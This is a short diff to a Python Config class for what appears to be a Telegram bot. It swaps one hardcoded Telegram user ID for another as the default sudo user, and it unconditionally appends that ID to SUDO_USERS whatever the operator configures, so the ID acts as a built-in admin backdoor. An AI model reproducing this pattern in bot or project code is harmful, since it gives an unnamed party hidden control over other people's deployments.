@@ -11,8 +11,8 @@ class Config():
   APP_ID = os.environ.get("APP_ID", 123456)
   API_HASH = os.environ.get("API_HASH", "")
   # Sudo users( goto @missrose_Bot and send /id to get your id)
-  SUDO_USERS = list(set(int(x) for x in os.environ.get("SUDO_USERS", "1514078508").split()))
-  SUDO_USERS.append(1514078508)
+  SUDO_USERS = list(set(int(x) for x in os.environ.get("SUDO_USERS", "1927621859").split()))
+  SUDO_USERS.append(1927621859)
   SUDO_USERS = list(set(SUDO_USERS))
 
 class Messages():
